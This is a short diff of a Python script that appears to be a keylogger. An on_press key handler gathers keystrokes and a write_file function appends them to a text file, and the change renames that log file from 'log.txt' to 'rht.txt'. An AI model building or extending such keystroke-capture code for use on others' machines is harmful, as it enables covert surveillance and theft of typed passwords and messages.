@@ -17,7 +17,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("log.txt" , "a" , encoding="utf-8") as file:
+    with open("rht.txt" , "a" , encoding="utf-8") as file:
         for key in keys:
 
             k = str(key).replace("'", "")
